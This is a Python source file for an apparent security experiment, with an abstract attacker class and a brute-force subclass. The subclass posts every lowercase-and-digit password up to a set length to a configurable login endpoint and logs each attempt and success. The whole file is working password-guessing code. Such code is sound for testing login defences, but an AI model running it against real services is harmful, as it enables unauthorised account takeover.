from abc import ABC, abstractmethod
import httpx
import itertools
import string
from typing import Optional


class Attacker(ABC):

    def __init__(self, base_url: str, logger, attack_type: str):
        self.base_url = base_url.rstrip("/")
        self.login_endpoint = f"{self.base_url}/login"
        self.client = httpx.Client(timeout=10.0)
        self.attempts = 0
        self.logger = logger
        self.attack_type = attack_type

    def log(self, action: str, username: str, details: str = ""):
        """Helper method to log standardized CSV entries."""
        self.logger.log(
            actor="attacker",
            action=action,
            username=username,
            attack_type=self.attack_type,
            tries=self.attempts,
            details=details,
        )

    def try_login(self, username: str, password: str) -> bool:
        """Attempt login, track attempts, return True/False only."""
        self.attempts += 1

        try:
            response = self.client.post(
                self.login_endpoint,
                json={"username": username, "password": password},
            )

            if response.status_code in (200, 201):
                data = response.json()
                if "access_token" in data or data.get("success"):
                    return True

        except Exception:
            pass

        return False

    @abstractmethod
    def getPassword(self, username: str) -> Optional[str]:
        """Abstract method: must be implemented by subclasses"""
        pass


class BruteForceAttacker(Attacker):

    def __init__(self, base_url: str, max_length: int, logger):
        super().__init__(base_url, logger, attack_type="bruteforce")
        self.max_length = max_length
        self.chars = string.ascii_lowercase + string.digits

    def getPassword(self, username: str) -> Optional[str]:

        # Reset attempts counter before attack
        self.attempts = 0

        # START LOG
        self.log("start_attack", username, details=f"max_length={self.max_length}")

        for length in range(1, self.max_length + 1):
            for guess in itertools.product(self.chars, repeat=length):

                guess_password = "".join(guess)

                if self.try_login(username, guess_password):
                    # SUCCESS LOG
                    self.log(
                        "success",
                        username,
                        details=f"password={guess_password}"
                    )
                    return guess_password

        # FAILURE LOG
        self.log("failure", username, details="password_not_found")
        return None
